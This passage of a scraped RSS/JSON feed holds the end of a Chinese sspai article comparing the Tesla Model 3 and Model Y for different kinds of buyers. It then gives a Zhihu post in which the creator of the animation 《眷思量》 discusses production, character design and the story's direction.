src=\"https://cdn.sspai.com/2021/07/08/cb5eccfc8b244abc6c988c84f3032dc8.png\"><figcaption>跟 Model 3 一起抵达珠穆朗玛峰</figcaption></figure><p>既然 Model Y 没有那么好的驾驭感，那它的优点是什么呢？当然是空间，虽然都是五座配置，但 Y 的后排要宽阔很多，掀背尾箱也大很多，特别是座椅高度提升，完全可以伸直腿，进入半躺状态。而 Model 3 后排座椅矮，会有点半蜷缩的感觉，跑稍远的路程，乘坐体验会比较累，身材高大的人更明显。所以如果你后排需要经常载人，不管是家人还是朋友，Model Y 是最佳选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/5a410ca7113c6bff571e60de04dc7516.png\"><figcaption>可以在 Y 的后排完成轻办公</figcaption></figure><p>载物空间也更多，特别是加装旅行箱之后，基本可以把露营远行的装备一直带着，随时可以去郊外 Happy，虽然 Model 3 也能装车顶行李箱，但看起来会很违和，不适合长期挂载，Model Y 车型就没有这个问题，同时，加上行李箱的高度不超过 1.9 米，你仍然可以穿梭在任何城市停车场和隧道，没有限高的麻烦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/3b9862f134a8f111ec03de4f5c55198e.png\"><figcaption>享受安静的户外时光。</figcaption></figure><h2>续航里程和性能差别</h2>\n<p>标准续航版 Model 3 官网续航 468 公里，实际表显续航应该是 420 公里，这个续航距离在 150 公里范围内的城际往返，会略有焦虑，但是现在的充电桩铺设率已经相当高，在高速或者城区补一次电就没有问题。所以，要了解你周围城市的充电网络情况，以及你日常的出行距离和计划来判断。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/779228494e597aeb3d97c39e36b18239.png\"><figcaption>高速路充电桩普及很快</figcaption></figure><p>高性能版的 Model 3 官网续航 605 公里，实际表显是 480 公里左右，续航并没有长很多，加速从普通的百公里 5.6 秒提升到 3.3 秒，我也开过几次性能版，说实话，在常规路况下，确实感受不到明显的差异，如果去专业赛道，开启赛道模式，应该会更加过瘾。所以，要不要多花 9 万买性能版，完全是看你的预算能力和个人偏好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/56b4cddc43dbc13f256a4c19e04ad896.jpeg\"></figure><p>Model Y 现在有三款了，新上线的标准续航版，官网标称 525 公里，表显续航应该是 420 公里左右 ，应对城市周边出行基本够用。那它跟长续航版的主要差别就是四驱能力，四驱到底有没有用呢？跑过川藏和青藏就知道有用，不管是雨雪还是泥泞，开启越野模式，开起来非常稳，大大增加安全性和脱困能力，但 Model Y 适合专门玩越野吗？并不行，因为底盘不够高，没有专业保护设备，没法通过巨石或深坑。所以长续航的意义，更多是提升一定的性能，增加特殊路况下的安全稳定性，比标准版增加了 100 公里的实际续航，那么相差 7 万的价格，该怎么选择，你得自己评估一下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/b2a21a03cd5edcc28aea5d3987ede6f7.png\"><figcaption>比 3 高一点的底盘，就有更好的通过性</figcaption></figure><p>至于性能版的 Model Y，我本身不是性能控，就想不到需求点了，如果想玩赛道，可以选性能版 Model 3，还便宜 3.8 万元，那它的受众应该是性能控，同时想兼具空间的用户，但受限于 Y 的车身尺寸，这个性能感能体现出多少？我这里先打一个问号。</p>\n<p>用一个表格来呈现，也许会更清晰一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/b69a77e828637cfdd698dd55f6b773c8.png\"></figure><p>这里要说明一下，高级内饰，包括 14 喇叭音响，沉浸音效，方向盘加热等常用，标准续航的 Model 3 是普通音响配置或缺失一些功能，具体可以去官方查询，但标准续航的 Model Y 是标配高级内饰的。竞速套件包括专门的轮毂和轮胎，刹车卡钳，碳纤维尾翼，铝合金踏板等等，其实这些配件单买都不便宜，相对来说附加值高了不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/f64dae815194723e82f069f8f9c2be13.png\"></figure><p>所以综合来看，选车首先要明确自己的用车需求，用车人数，用车场景，并不是听别人讲哪款便宜，哪款更有性价比，就盲目跟风，我就从一些人群或用车场景来分类说说。</p>\n<h2>单身青年或二人世界</h2>\n<p>如果短期内没有生娃或者跟父母一起生活的打算，一个人或二人世界，依然推荐选择 Model 3，价格实惠，好开好停，偶尔出去玩玩问题也不大，超过 400 公里的续航，就算两个人想跑趟拉萨也是可以的，只要规划好充电路线就行，很多车主都已经亲自验证过了。如果俩人都有驾照，小车也对女生也更友好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/a42bb03fecb77bd33d3747632da7b812.png\"></figure><p>当然，如果是二人世界，但特别偏爱旅行，或者是自由职业者，推荐选择 Model Y，更大的空间可以带更多旅行物品，放倒后排座椅就是最舒服的户外帐篷。行李架上可以自己增加更多需求的旅行装备，包括行李箱，车边帐，车顶自行车架子等等。详细的可以参考我之前 <a href=\"https://sspai.com/post/66458\" target=\"_blank\">去川藏的折腾文章</a> 。</p>\n<h2>奶爸或五口之家</h2>\n<p>经常带孩子或偶尔带父母出行，就选 Model Y，它不仅能承载五人需求，还有足够的行李空间。日常也能有足够的车内空间，防止小孩吵架。周末也可以带着一家去郊游和露营一下，调节生活节奏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/162c6e41eb3ba946b878958bbd80df70.png\"></figure><p>当然，如果是兼顾公司用车，也推荐 Model Y，不管是临时接待客户，带同事团建，还是变身拉货，都能很好的完成任务。所谓跨界多功能也就是这个意思。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/71d443e1e5175576bd1eb169a1c047d0.png\"></figure><p>最后说两句吧，车是交通工具，也是一种生活方式，特别是智能汽车时代的到来，它将给我们带来更多的空间和时间，理性选择，善用价值，才是选车和用车的根本所在。反正我对自己的长续航 Model Y 还是挺满意的，也不会因为标准续航版更便宜而感到后悔，毕竟，它可能是第一个抵达珠峰脚下的 Model Y，属于自己的体验和记忆是没法估价的。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺 </a>🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67607"},{"title":"如何评价动画《眷思量》第五集？","date":"2021-07-07 04:00:11","description":"\n<p>大家好，这次非常感谢知乎的邀请，经过深度了解，发现知乎是一群有思想有态度的年轻人经常聚集交流的平台。感觉能让我这个很少上网冲浪的老人家跟年轻人又近了一步~但是初次上来非常非常紧张，为了备稿失眠了，首分享不知道该说啥好，就先跟大家先聊聊最近的心情和感受吧。   </p>\n<p><img src=\"https://pic4.zhimg.com/v2-4ff91f0924f67819391d215a726ece7f_720w.jpg?rss\" data-rawwidth=\"770\" data-rawheight=\"1365\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4ff91f0924f67819391d215a726ece7f\" data-watermark-src=\"v2-d4e48baecbf066026353ba24b5d68d24\" data-private-watermark-src=\"v2-19bfb76956873f55eb05b4f4563cb4d3\"></p>\n<p>这周一，《眷思量》第五集终于上线，且传来破亿喜讯，恍惚中还是十分开心，其实我从6月14号首播当天，到今天，这段时间仍旧深陷在最后几集高潮戏的紧张赶制中。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-262b3109f614d85df38a57bf69b61515_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-262b3109f614d85df38a57bf69b61515\" data-watermark-src=\"v2-8822564c81051ac66b445d01abb28501\" data-private-watermark-src=\"v2-7dff08c20aa9d3f703c1b40a90e4be0e\"></p>\n<p>和没上线前不一样的就是，每天还需要应对一大堆宣发物料的制作和审核，以及随时会来的合作洽谈和访谈准备等，所以前几周一直没什么时间上线跟观众朋友们多做交流，因为如果在公司见识过我工作状态和排队审核状态的人就知道，小伙伴们很多人加班到很晚，为了每天早点下班回家，排队等反馈的人的眼神能把其他插队的人生吞活剥=v=。</p>\n<p>我就比他们幸运多了～我不用走下班回家这个流程，我就住在公司阁楼，下楼就上班，上楼就躺倒。。。3年来生活就是工作，工作也是生活，无缝衔接。。。。。。嗯，是幸福的！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e1879b9f41c6eba70a9c68cac7d591bd_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e1879b9f41c6eba70a9c68cac7d591bd\" data-watermark-src=\"v2-efebadafe6c45a2961ea1e4e7ea5a15a\" data-private-watermark-src=\"v2-1b20342ba1ed8867da47981993729666\"></p>\n<p>之前幻想上线的时候应该会轻松些了吧，没想到真的到了这个阶段却是没上线前成倍的忙，以至于最近更晕头转向了，大概是我太吹毛求疵了，很多细节不磨到位就不肯罢休，也许草草收了尾，赶紧杀青，就不会像现在这样连轴转都转不过来了。但……那就不是我了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-43de09b692fb1330520b2eda7d2d649f_720w.jpg?rss\" data-rawwidth=\"1178\" data-rawheight=\"777\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-43de09b692fb1330520b2eda7d2d649f\" data-watermark-src=\"v2-45f2975a595d090b88f6afa81fef11cb\" data-private-watermark-src=\"v2-2c86b8e18109e5fe83383f2c9d4977d8\"></p>\n<p>前几周赶各环节反馈加上其他方面的工作量爆发，导致睡眠时间严重缩减到破纪录，最夸张的一天，睡了1个半小时爬起来，然后第二天，睡了3个半小时，两天，48小时，睡眠时间5小时，其他时间就像机器一样，白天跟各组人轮番交流推进度，晚上不断处理着各种反馈。第三天实在扛不住，才强制自己切断工作多睡几个小时。我相信自己能扛过去，一如每次遇到制作上的坎坷，都坚持着咬牙扛过来一样，因为我的背后还有很多各环节、各公司的小伙伴们支撑着我，他们都和我一样，想做一部好看的片子，跟有共同的目标的人们一起共事，让我无比欣慰也感觉充满力量。</p>\n<p>看到大家心疼我最近通宵很多，有留言说可以不那么辛苦，可以等等眷眷，会心一笑的同时，觉得确实，留得青山在不怕没柴烧，我是应该好好规划下工作强度和分工分担的问题了，但先把这一季扛完吧！</p>\n<p>《眷思量》是我从年少时起就一直做的一个梦。占据了我整个青春期的懵懂悸动和期许，我觉得自己属于很幸运的那种，眷眷不忘，果然必有回响，如今，我终于有机会让眷眷在你们面前徐徐展开，让你们看看我脑海中光怪陆离的东方幻想世界。以及一个个魂牵梦萦、美不胜收的美人们的具体样子。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-68099d8102d55c2463b60bd3b10135e6_720w.jpg?rss\" data-rawwidth=\"1914\" data-rawheight=\"1074\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-68099d8102d55c2463b60bd3b10135e6\" data-watermark-src=\"v2-61da933fd2e72145546129ac4280a07f\" data-private-watermark-src=\"v2-a747c00dab9d5106ff8404bf0d555f21\"></p>\n<p>初次有机会将自己儿时的梦实现，我无比珍惜这个机会，因为作为在行业摸爬滚打的从业人士，太明白这个机会代表了什么，也明白如果不把握好，这辈子可能没有第二次机会了。</p>\n<p>所以，在《眷思量》里，我加入了很多一直很想尝试的思路。</p>\n<p>比如关于人物的刻画展现。我希望大家看到这些角色的时候可以感受到他们所处的身份地位、状态人物性格等，而不是只能通过旁白或剧情的介绍，这样他们表演起来，大家更能感同身受他们的状态。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0bee574fc367af3081f8b92b62e54b48_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-0bee574fc367af3081f8b92b62e54b48\" data-watermark-src=\"v2-d44daf740c6bc7238bdbc95f9bbc4a53\" data-private-watermark-src=\"v2-7c3a13bbd280d214700c8b7b73d8104d\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c47d965bfa910f9ffcab5aa1ef47ef19_720w.jpg?rss\" data-rawwidth=\"1919\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c47d965bfa910f9ffcab5aa1ef47ef19\" data-watermark-src=\"v2-b6b224d39021621322224e8f159e4dc2\" data-private-watermark-src=\"v2-360e65b8866edd28ee7b9ab4c57a870d\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-416e62be0de140797d32dbc68e14ecd3_720w.jpg?rss\" data-rawwidth=\"1850\" data-rawheight=\"1016\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-416e62be0de140797d32dbc68e14ecd3\" data-watermark-src=\"v2-ed3f990fa882bc4607db310fd1c2f758\" data-private-watermark-src=\"v2-ce7b9ad0d839ff22996aa2e4edeaba32\"></p>\n<p>以及角色和角色之间的关系可以通过他们的长相就看出来。</p>\n<p>比如小镜玄到大镜玄是真的成长起来的模样。我不标注大家也能看出是他小时候。片中的孩子都是用这种方式来建模的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b3caa00e2bd18042e714ff20ec1a90bc_720w.jpg?rss\" data-rawwidth=\"1919\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-b3caa00e2bd18042e714ff20ec1a90bc\" data-watermark-src=\"v2-8978fa402ad5d22dc7eb6d050db119fa\" data-private-watermark-src=\"v2-24db6cb167e1316590f0928e0b3af83d\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-713b2c6af3ffb1355e72e34440632372_720w.jpg?rss\" data-rawwidth=\"1926\" data-rawheight=\"1085\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-713b2c6af3ffb1355e72e34440632372\" data-watermark-src=\"v2-f8358988044d645cc0f8a296f18eb535\" data-private-watermark-src=\"v2-d60fb592382c05e9f131fb952cce9017\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c475dbb6b33b305d96a1727d9a17fee1_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c475dbb6b33b305d96a1727d9a17fee1\" data-watermark-src=\"v2-5ffffa3437c78a21e3068f6981704677\" data-private-watermark-src=\"v2-95f7e5280a20eba9902c086c419bfa6b\"></p>\n<p>再比如程染、程熔和两个儿子是真的在遗传学上有继承的五官特征等等。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f2e4ee60c810a41bc731d8b4df1f8a82_720w.jpg?rss\" data-rawwidth=\"1937\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f2e4ee60c810a41bc731d8b4df1f8a82\" data-watermark-src=\"v2-28556adb4108df135d2192ef99f5a0d6\" data-private-watermark-src=\"v2-bba9cff5fb6024221ca6025f05e71125\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-caad8ebafdccf9622b310a835b465710_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1078\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-caad8ebafdccf9622b310a835b465710\" data-watermark-src=\"v2-7163c43e6b21fe527f465b8b44fc0a0e\" data-private-watermark-src=\"v2-1c650815dcc131c7be829a0c1e274405\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cae63ec4269943df6e1380bb2cc365b6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1078\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-cae63ec4269943df6e1380bb2cc365b6\" data-watermark-src=\"v2-e4f2d01a29aec8cd9bfe0e6b9662b291\" data-private-watermark-src=\"v2-4ae27a63affc073a0b1e4bac32d99866\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dbbf57a8f020f6acd68af90893e0b2f0_720w.jpg?rss\" data-rawwidth=\"1911\" data-rawheight=\"1079\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dbbf57a8f020f6acd68af90893e0b2f0\" data-watermark-src=\"v2-edee37324a283a5c0e2f5a57f5ce4000\" data-private-watermark-src=\"v2-70c279043cea10a7b0f264597c13922e\"></p>\n<p>所以在创造这些角色的时候，我想通过塑造内在气质和外在形象结合的方式来诠释人物的真实感，再加上每场戏对光影的设计，赋予每个角色更立体的表达。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4a2f9b2b5d08841c9ca665658fe584dd_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4a2f9b2b5d08841c9ca665658fe584dd\" data-watermark-src=\"v2-71e4c8d6cc7e8e79f0bacb5a65039341\" data-private-watermark-src=\"v2-a1b13fbba49e999a9a19ad5ca6de5617\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-27b87c91d50486c36925482b51a94992_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-27b87c91d50486c36925482b51a94992\" data-watermark-src=\"v2-3873bd9962c173fdf63d63a3447058f6\" data-private-watermark-src=\"v2-f6bb3d6e62039c388d427fadd54bbb7c\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-68f84222b10d5bc3ece3e127e3bcd568_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-68f84222b10d5bc3ece3e127e3bcd568\" data-watermark-src=\"v2-0df87a04e07b76475e8ee56d0f050b16\" data-private-watermark-src=\"v2-6df8d2d7ce9c8d025ba92444b28c5e4b\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2916f20cb31f206abf8033c9887d811e_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-2916f20cb31f206abf8033c9887d811e\" data-watermark-src=\"v2-23239cf11c26303768da70b101342dec\" data-private-watermark-src=\"v2-04503e5b66f936e28388d83b1cd1b54b\"></p>\n<p>再比如关于场景的创意思路，眷思量这个故事我想表达的是一个富有东方美学的架空幻想故事，所以场景首先要体现出中式的美感和风骨，但又不是真正的现实朝代感，所以我在影片中就尝试建立了一种新中式美学的思路，让建筑既有古意，又不同于实际的古代建筑本身。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6b13fc48e7e4576a2d78b86d197db2d6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b13fc48e7e4576a2d78b86d197db2d6\" data-watermark-src=\"v2-73011cbc1ae854fe18485320291a26c8\" data-private-watermark-src=\"v2-fcbf8fc0d3466184b16f62b311337f2f\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0c61a2295d4e2bbdab6ffd5146cba6b8_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-0c61a2295d4e2bbdab6ffd5146cba6b8\" data-watermark-src=\"v2-f3f064cd38ee7cd5190bb2bf34c36180\" data-private-watermark-src=\"v2-29f719c39e8cb5067cdb8943581d1e36\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-81086387d2ea9b766aac09562f49897b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-81086387d2ea9b766aac09562f49897b\" data-watermark-src=\"v2-aa919ba8a640da6bbab3ea7fa0f598ee\" data-private-watermark-src=\"v2-e7e40f6d5f682c5ea4e2fef8e12b274b\"></p>\n<p>其中藏典阁和议事堂这两座岛上代表建筑都是带有这种思路的神迹建筑设计。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-357128375a3eca820ea100bd6d7b966a_720w.jpg?rss\" data-rawwidth=\"1923\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-357128375a3eca820ea100bd6d7b966a\" data-watermark-src=\"v2-4ab7423a46db12545f27e1ae94b68723\" data-private-watermark-src=\"v2-d56250ba4eb9825cff8e441a7700b5fb\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5dd6f33de1f94e7b026192004d94bfaa_720w.jpg?rss\" data-rawwidth=\"1840\" data-rawheight=\"1035\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-5dd6f33de1f94e7b026192004d94bfaa\" data-watermark-src=\"v2-0944e487093eba1143b5dcd77c705d7b\" data-private-watermark-src=\"v2-529aee02f1729fe05927cadfa550f9ed\"></p>\n<p>以上这些，大家在播出的影片中如果能感受到一些我就很欣慰了。</p>\n<p>从播之前忐忑的想知道大家的反应，到上线后被迫忙的焦头烂额顾不上了解，再到如今制作的工作正逐渐收尾，开始陆续回应多方的关注和交流。也很感谢知乎这次邀请我来跟大家好好交流一下。我就借这次机会说明下关于剧本身我的一些初始想法吧。</p>\n<p>1，先说说关于《眷思量》的主线剧情。虽然我之前都说过，但可能很多人还是没有看到，于是刚好在大知乎也说下！</p>\n<p>在我心中，这是一部全员搞事业的剧，爱情是辅助，而且里面还有亲情和友情等美好的情感。所以并不会从事业番忽然变成纯恋爱番哦。想看恋爱的大家多多二创吧～我也很期待看到大家发挥～</p>\n<p>就像《柯南》主线是断案，《棋魂》主线是围棋，《眷思量》的主线是讲述岛上以男女主为代表视角的一群年轻人如何突破枷锁寻找心中自由的故事。且感情设置都是1V1，不分叉不开后宫，谢谢！</p>\n<p>可能因为我心里这些角色都很美，可以说是个全员美人的颜番了，谁让我是个会建模的终极颜狗呢=v=。。。。，这个优势不充分利用下我怎能甘心，于是我也尽量在把美感做到我想要的程度。以及后续还会有我心中其他类型的极品美帅酷的角色登场，当然，前提是如果能继续往下做的话。。。。。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a4d5ca4a1ae6175cb2771cf061da5d8c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"840\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a4d5ca4a1ae6175cb2771cf061da5d8c\" data-watermark-src=\"v2-d88fbe8fff2a361485846edc1f7496a5\" data-private-watermark-src=\"v2-f36e55826343a98fbe73c7101cfd5676\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7704cd69e702c6cc14058cf30ee88b25_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"889\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7704cd69e702c6cc14058cf30ee88b25\" data-watermark-src=\"v2-451bac8031e0b2480d229675568357d8\" data-private-watermark-src=\"v2-e1072c3a7f91f7bcd6615e5819d5d970\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4f231adc612eb9133c086851f7bcae2b_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"669\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4f231adc612eb9133c086851f7bcae2b\" data-watermark-src=\"v2-5e3d36a7074e6493a34de6c6157b7c19\" data-private-watermark-src=\"v2-331d26fe60fa288d152dab8bf24d1a6a\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-fc30fa01dc933529351b49a141d477ed_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"552\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-fc30fa01dc933529351b49a141d477ed\" data-watermark-src=\"v2-0584282a79d6362a9a69dbe3f19b1bb7\" data-private-watermark-src=\"v2-b88a0ab7f1c5e369d4ed22126f68d490\"></p>\n<p>所以大家看到漂亮角色可能都会有磕CP啊拉郎啊之类的想法，这我能理解，也拦不住，但希望大家和和气气快快乐乐地磕，圈地自萌，不要因此产生无谓的纷争。</p>\n<p><br></p>\n<p>2，关于某些观众可能误会这是一部大女主剧的问题，从19年到21年，我也是通过各种自己能接触到的渠道重申多次。思量这部剧不是大女主剧，男女主都是重要的表达视角。</p>\n<p>以及因为角色的制作先后顺序不同，所以露面的前后顺序也不一样。可能导致有了解不全的人误解了。在这里也说明一下。</p>\n<p>眷眷的每个角色对我来说都是独一无二的，对故事都很重要。他们的出场是服从剧情的安排，在正片里的出现都是为推动剧情的发展。</p>\n<p>而在主线故事之外，我也给某些角色写过专属番外，如果以后时机成熟，可以看大家诉求，再决定是否为某个角色量身打造番外篇。</p>\n<p>我做眷眷的初衷就是把我脑海里这个原型故事完整表达好，每个绝美的人物都塑造好，他们在其中都很优秀，有各自的作用。只要大家还喜欢看，只要公司能维持正向运转，我会尽我所能一直做下去直到大结局的。</p>\n<p>3，然后来聊聊思量初相见时期的故事吧，因为很多人是开播后才注意到有思量这部剧的，所以难免对此充满疑惑。</p>\n<p>眷思量开始启动之初，面临一个很现实很残酷的问题：这是一个原创作品，无IP支持，无成熟商业模式，各方都在观望，我必须拿出东西来说服更多的人来支持这个项目。</p>\n<p>所以我决定先做一个眷思量的概念PV，让别人能以最直观的方式看到我脑海里的东西。</p>\n<p>在选择PV出场角色的时候，我选择了奉眠。之所以选择眠眠有两个原因：</p>\n<p>      1，我之前微博提过，因为她是思量故事里，第一个以神族身份和形态登场的角色，其他角色第一季的时候都苦哈哈的在思量岛渡劫。只有眠眠初登场就一直持续着她神秘华丽高贵的样子。我觉得是个可以说明我思量整体视觉调性的角色。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6b1f2d509d3cf7b07baacd493f42a042_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1407\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b1f2d509d3cf7b07baacd493f42a042\" data-watermark-src=\"v2-c3251d68533e541455a7e4c953412e8e\" data-private-watermark-src=\"v2-3692f8f0c94014bf0b2a90ec0c22e304\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-63a9e5096431ab5e2042c5bcf6aaf148_720w.jpg?rss\" data-rawwidth=\"1784\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-63a9e5096431ab5e2042c5bcf6aaf148\" data-watermark-src=\"v2-f6e29f32b4c543dd226035622eb03b73\" data-private-watermark-src=\"v2-ae915d4b83dd2b60dd235bf074e0b5ee\"></p>\n<p>        2，主角在我开始动手做PV的当时，模型材质还没完全做完，但很多人着急看效果，项目已经不能等了。而且眠眠可以充分展示我们项目在模型方面的技术水平。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-146c920eb20052e6f86d5a626b3c1ee4_720w.jpg?rss\" data-rawwidth=\"1700\" data-rawheight=\"718\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-146c920eb20052e6f86d5a626b3c1ee4\" data-watermark-src=\"v2-5670fa87e67affbafdf0840bb95939a8\" data-private-watermark-src=\"v2-dcf7b89d7b66f49a49e9f25012bf6899\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f07c110c438f59c5fb1eba0390ae124c_720w.jpg?rss\" data-rawwidth=\"1725\" data-rawheight=\"723\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f07c110c438f59c5fb1eba0390ae124c\" data-watermark-src=\"v2-1ba6a7d996edd81609a81e80b1621275\" data-private-watermark-src=\"v2-3c772aad271b608f8bb817aa6efd5968\"></p>\n<p>2019年3月，我们上线的第一支PV。这支PV在微博和B站皆获得了过百万的播放量，收获了热烈的反馈，增加了各方的信心，也让我有了足够的支持把思量这个项目继续下去。</p>\n<p>当然以上这只是我在做思量时遇到的无数难关之一，而直到此时，我也不知道能不能继续把思量做完。让大家完完整整看到这个故事。</p>\n<p>但不管如何，在眷思量小有成绩之际，在眷眷的制作层面来讲，我要感谢很多人~</p>\n<p><br></p>\n<p>首先是我们炎央文化可爱的小伙伴们！他们中很多人怀抱着对我的信任，已经陪我走过了三年四年的时间，每个人都对作品付出了大量的心血。炎央文化的主创团队是眷思量这个作品的创作核心。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6f486ca8e6ff713dd92511e4c7a92879_720w.jpg?rss\" data-rawwidth=\"1619\" data-rawheight=\"1180\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6f486ca8e6ff713dd92511e4c7a92879\" data-watermark-src=\"v2-819ead9a42558832b7094143d7507b7a\" data-private-watermark-src=\"v2-b49b649c6d7976f0726b310c6ebeeea0\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5bdef594a4c58c8661cb0b29bd5e6a04_720w.jpg?rss\" data-rawwidth=\"1896\" data-rawheight=\"1711\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-5bdef594a4c58c8661cb0b29bd5e6a04\" data-watermark-src=\"v2-982dc84b37739a70a30f01737f8febe2\" data-private-watermark-src=\"v2-e134fb6b7801c212f0803b7024e0f3de\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e4d03f5115799ebe9c0c641adec86f4c_720w.jpg?rss\" data-rawwidth=\"2135\" data-rawheight=\"859\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e4d03f5115799ebe9c0c641adec86f4c\" 